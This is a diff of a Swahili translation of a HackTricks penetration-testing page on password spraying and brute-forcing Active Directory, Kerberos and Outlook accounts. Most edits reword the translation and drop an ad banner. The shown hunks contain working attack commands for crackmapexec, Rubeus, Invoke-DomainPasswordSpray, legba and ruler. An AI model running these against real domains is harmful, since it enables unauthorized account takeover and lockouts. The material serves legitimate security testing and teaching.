@@ -2,24 +2,19 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-<figure><img src="/images/image (2).png" alt=""><figcaption></figcaption></figure>
-
-Deepen your expertise in **Mobile Security** with 8kSec Academy. Master iOS and Android security through our self-paced courses and get certified:
-
-{% embed url="https://academy.8ksec.io/" %}
 
 ## **Password Spraying**
 
-Mara tu unapokuwa umepata **majina halali ya watumiaji** kadhaa unaweza kujaribu **nenosiri za kawaida** (zingatia sera ya nenosiri ya mazingira) kwa kila mmoja wa watumiaji walio gundulika.\
-Kwa **default** **urefu wa chini** wa **nenosiri** ni **7**.
+Mara tu unapopata **majina halali ya watumiaji** kadhaa unaweza kujaribu **nenosiri za kawaida** zaidi (zingatia sera ya nenosiri ya mazingira) na kila mmoja wa watumiaji ulioyagundua.\
+Kwa **default** urefu wa **minimum** wa **nenosiri** ni **7**.
 
-Orodha za majina ya kawaida ya watumiaji pia zinaweza kuwa na manufaa: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
+Orodha za majina ya kawaida ya watumiaji zinaweza pia kuwa na manufaa: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
 
-Kumbuka kwamba unaweza **kufunga baadhi ya akaunti ikiwa utajaribu nenosiri kadhaa zisizo sahihi** (kwa default zaidi ya 10).
+Kumbuka kwamba **unaweza kufunga akaunti zingine ikiwa utajaribu nenosiri kadhaa zisizo sahihi** (kwa default zaidi ya 10).
 
-### Get password policy
+### Pata sera ya nenosiri
 
-Ikiwa una baadhi ya akidi za mtumiaji au shell kama mtumiaji wa domain unaweza **kupata sera ya nenosiri kwa**:
+Ikiwa una baadhi ya akidi za mtumiaji au shell kama mtumiaji wa kikoa unaweza **pata sera ya nenosiri kwa**:
 ```bash
 # From Linux
 crackmapexec <IP> -u 'user' -p 'password' --pass-pol
@@ -36,7 +31,7 @@ net accounts
 
 (Get-DomainPolicy)."SystemAccess" #From powerview
 ```
-### Ukatili kutoka Linux (au yote)
+### Utekelezaji kutoka Linux (au yote)
 
 - Kutumia **crackmapexec:**
 ```bash
@@ -82,15 +77,15 @@ done
 # check passwords for all users in current domain
 .\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
 ```
-- Pamoja na [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Inaweza kuunda watumiaji kutoka kwenye kikoa kwa default na itapata sera ya nywila kutoka kwenye kikoa na kupunguza majaribio kulingana na hiyo):
+- Kwa [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Inaweza kuunda watumiaji kutoka kwenye kikoa kwa default na itapata sera ya nywila kutoka kwenye kikoa na kupunguza majaribio kulingana na hiyo):
 ```powershell
 Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
 ```
-- Na [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
+- Pamoja na [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
 ```
 Invoke-SprayEmptyPassword
 ```
-## Nguvu ya Kijamii
+## Ukatili wa Nguvu
 ```bash
 legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
 ```
@@ -104,7 +99,7 @@ Kuna zana nyingi za p**assword spraying outlook**.
 - Na [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
 - Na [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)
 
-Ili kutumia yoyote ya zana hizi, unahitaji orodha ya watumiaji na nenosiri / orodha ndogo ya nenosiri za kupuliza.
+Ili kutumia yoyote ya zana hizi, unahitaji orodha ya watumiaji na nenosiri / orodha ndogo ya nenosiri za kutumia.
 ```bash
 ./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
 [x] Failed: larsson:Summer2020
@@ -123,17 +118,12 @@ Ili kutumia yoyote ya zana hizi, unahitaji orodha ya watumiaji na nenosiri / oro
 - [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
 - [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)
 
-## Marejeo
+## References
 
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
 - [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
 - [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
 - [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)
 
-<figure><img src="/images/image (2).png" alt=""><figcaption></figcaption></figure>
-
-Deepen your expertise in **Mobile Security** with 8kSec Academy. Master iOS and Android security through our self-paced courses and get certified:
-
-{% embed url="https://academy.8ksec.io/" %}
 
 {{#include ../../banners/hacktricks-training.md}}
